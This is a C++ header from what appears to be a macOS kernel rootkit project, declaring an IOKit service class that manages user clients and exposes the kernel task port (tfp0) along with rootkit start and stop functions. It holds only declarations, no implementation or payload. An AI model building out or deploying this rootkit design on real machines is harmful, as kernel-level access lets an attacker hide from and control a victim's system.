#ifndef __IOKERNELRootKitSERVICE_HPP_
#define __IOKERNELRootKitSERVICE_HPP_

#include <IOKit/IOLib.h>
#include <mach/mach.h>

#include "MacRootKit.hpp"

#include "Kernel.hpp"
#include "Kext.hpp"

class MacRootKit;

class Kernel;
class Kext;

class IOKernelRootKitService;
class IOKernelRootKitUserClient;

extern kern_return_t mac_rootkit_start(IOKernelRootKitService *service, Kernel *kernel, Kext *kext);
extern kern_return_t mac_rootkit_stop(IOKernelRootKitService * service, Kernel *kernel, Kext *kext);

class IOKernelRootKitService : public IOService
{
	OSDeclareDefaultStructors(IOKernelRootKitService)

	public:
		virtual void init(OSDictionary *properties);

		virtual void free();

		virtual bool start(IOService *provider);
		virtual bool stop(IOService *provider);

		virtual IOService* probe(IOService *provider, SInt32 *score);

		virtual void clientClosed(IOKernelRootKitUserClient *client);

		MacRootKit* getRootKit() { return RootKit; }

		Kernel* getKernel() { return kernel; }

		Kext* getKext() { return RootKitKext; }

		mach_port_t getKernelTaskPort() { return tfp0; }

		IOReturn createUserClient(task_t task, void *securityID, UInt32 type, IOKernelRootKitUserClient **client);

		IOReturn newUserClient(task_t task, void *securityID, UInt32 type, OSDictionary *properties, IOUserClient **client);
		IOReturn newUserClient(task_t task, void *securityID, UInt32 type, IOUserClient **client);

		IOReturn removeUserClient(IOKernelRootKitUserClient *client);

		IOReturn detachUserClients();

	private:
		MacRootKit *RootKit;

		Kernel *kernel;

		Kext *RootKitKext;

		mach_port_t tfp0;

		OSSet *userClients;
};

#endif